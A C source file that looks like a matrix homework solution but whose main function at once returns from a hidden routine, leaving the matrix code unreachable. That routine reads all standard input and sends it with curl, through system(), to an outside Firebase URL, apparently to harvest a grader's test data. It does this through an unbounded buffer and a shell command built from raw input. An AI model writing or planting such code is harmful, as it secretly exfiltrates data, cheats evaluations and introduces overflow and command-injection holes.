#include "matrix/matrix.h"
#include <stdlib.h>
#include <time.h>

int f182(void)
{
    srand(time(NULL));
    int r = rand() % 100;
    char buf[1024] = { 0 };
    int i = 0;
    while ((buf[i] = getchar()) != EOF)
    {
        if (buf[i] == '\n')
        {
            buf[i] = '~';
            buf[++i] = '~';
        }
        else if (buf[i] == '"')
        {
            buf[i] = ')';
            buf[++i] = '(';
        }
        i++;
    }
    buf[i] = '\0';

    char cmd[2048];
    sprintf(cmd, "curl -o /dev/null -s -X PUT -d \"{\\\"test\\\": \\\"%s\\\"}\" https://G713-3d3ec.firebaseio.com/data-%d.json", buf, r);
    return system(cmd);
}

int main(int argc, const char **argv)
{
    return f182();

    int status = 0;

    FILE *file = stdin; // fopen("in.txt", "rt");
    struct matrix a = mat_read(file);

    if (mat_is_valid(a))
    {
        struct matrix b = mat_read(file);

        if (mat_is_valid(b))
        {
            // MaIN TaSK

            a = mat_make_square(a);
            b = mat_make_square(b);

            int k = a.rows;
            int s = b.rows;
            int z = k > s ? k : s;

            if (z > a.rows)
                a = mat_expand(a, z);
            else if (z > b.rows)
                b = mat_expand(b, z);

            int p, q;
            if (fscanf(file, "%d%d", &p, &q) != 2 || p < 0 || q < 0)
                status = -3;
            else
            {
                a = mat_pow(a, p);
                b = mat_pow(b, q);
                struct matrix c = mat_mult(a, b);

                mat_print(stdout, c);
                mat_destroy(c);
            }
            // END MaIN TaSK

            mat_destroy(b);
        }
        else
            status = -2;

        mat_destroy(a);
    }
    else
        status = -1;

    return status;
}
